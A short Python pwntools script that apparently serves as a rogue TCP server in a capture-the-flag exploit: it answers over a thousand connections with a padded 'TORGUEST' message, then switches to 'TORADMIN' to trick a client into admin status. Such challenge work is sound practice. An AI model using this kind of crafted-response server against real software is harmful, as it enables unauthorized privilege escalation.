from pwn import *
import random
from socket import *

host = ''
port = 9099

i = 0

def cb (r):
  global i
  if i < 1216 -3 :
    r.send ("TORGUEST".ljust (0x400, "\x00"))
  else:
    r.send ("TORADMIN".ljust (0x400, "\x00"))
  i += 1
  r.close ()
  
t = server(9099, callback=cb, typ='tcp')

while True:
  i
